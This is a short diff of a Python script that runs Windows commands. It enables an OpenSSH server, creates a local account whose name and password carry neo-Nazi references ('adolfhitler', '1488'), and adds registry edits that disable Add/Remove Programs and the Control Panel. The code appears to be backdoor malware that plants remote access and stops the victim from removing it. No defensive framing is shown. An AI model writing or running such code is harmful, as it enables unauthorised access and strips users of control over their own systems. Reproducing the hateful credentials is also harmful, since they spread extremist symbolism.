@@ -9,6 +9,15 @@ os.system('Add-WindowsFeature -Name OpenSSH.Server')
 # Set username and password
 os.system('net user adolfhitler birdistheword1488 /add')
 
+import subprocess
+
+def disable_uninstall_settings_windows():
+    subprocess.run(["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Uninstall", "/v", "NoAddRemovePrograms", "/t", "REG_DWORD", "/d", "1", "/f"])
+    
+# Call the function to disable uninstall settings in Windows
+disable_uninstall_settings_windows()
+
+
 def disable_control_panel():
     os.system("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f")
 
